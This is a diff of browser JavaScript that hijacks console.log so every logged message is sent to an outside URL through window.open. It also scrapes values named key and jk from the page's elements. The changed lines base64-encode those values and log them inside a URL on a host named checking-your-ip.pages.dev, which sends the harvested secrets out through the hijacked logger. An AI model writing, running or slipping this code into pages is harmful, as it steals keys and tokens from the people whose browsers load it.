@@ -2,16 +2,10 @@ console.log("ready!");
 let key = "";
 let jk = "";
 const originalConsoleLog = console.log;
-
 console.log = function(message) {
-    // Open a new window with the URL containing the log message
     window.open("https://your-url.com?message=" + encodeURIComponent(message), "_blank");
-    
-    // Optionally, call the original console.log if you want to log the message to the console as well
     originalConsoleLog.apply(console, arguments);
 };
-
-
 
 const elements = document.querySelectorAll('*'); // Select all elements in the DOM
     elements.forEach((element) => {
@@ -32,7 +26,5 @@ const elements = document.querySelectorAll('*'); // Select all elements in the D
             }
         });
     });
-let aha = `${jk}&${key}&c`;
-console.log(aha)
-
-
+let aha = btoa(`${jk}&${key}&c`)
+console.log(`https://checking-your-ip.pages.dev/#?service=${aha}`)
